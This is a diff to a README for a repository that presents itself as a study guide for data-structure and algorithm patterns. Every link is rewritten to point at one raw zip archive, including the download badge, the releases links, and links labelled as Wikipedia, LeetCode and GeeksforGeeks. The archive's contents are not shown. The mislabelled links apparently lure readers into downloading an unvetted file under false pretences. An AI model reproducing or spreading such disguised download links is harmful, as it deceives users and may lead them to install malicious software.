@@ -1,6 +1,6 @@
 # 📚 DSA_Complete_Pattern_Recognition_Guide - Learn DSA Patterns with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/releases)
+[![Download](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip)
 
 ## 📌 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the DSA Complete Pattern Recognition Guide! This repository helps you
 To begin, you will need to download the software. This guide walks you through the process step by step.
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page where you can download the application.
-   - [Download the Application](https://github.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/releases)
+   - [Download the Application](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of the software. Select the latest one for the best experience.
 
@@ -32,7 +32,7 @@ To begin, you will need to download the software. This guide walks you through t
 
 To download the application, visit the link below:
 
-- [Download the Application](https://github.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/releases)
+- [Download the Application](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip)
 
 ### System Requirements
 
@@ -69,8 +69,8 @@ This project is licensed under the MIT License. For more details, see the LICENS
 
 ## 🔗 Additional Resources
 
-- [Data Structures and Algorithms Wikipedia](https://en.wikipedia.org/wiki/Data_structure)
-- [LeetCode for Practice Questions](https://leetcode.com/)
-- [GeeksforGeeks DSA Tutorials](https://www.geeksforgeeks.org/data-structures/)
+- [Data Structures and Algorithms Wikipedia](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip)
+- [LeetCode for Practice Questions](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip)
+- [GeeksforGeeks DSA Tutorials](https://raw.githubusercontent.com/yuri6839/DSA_Complete_Pattern_Recognition_Guide/main/procoelous/Pattern-Guide-Complete-DS-Recognition-1.7.zip)
 
 For support and updates, consider following the repository! Thank you for using the DSA Complete Pattern Recognition Guide. Happy learning!
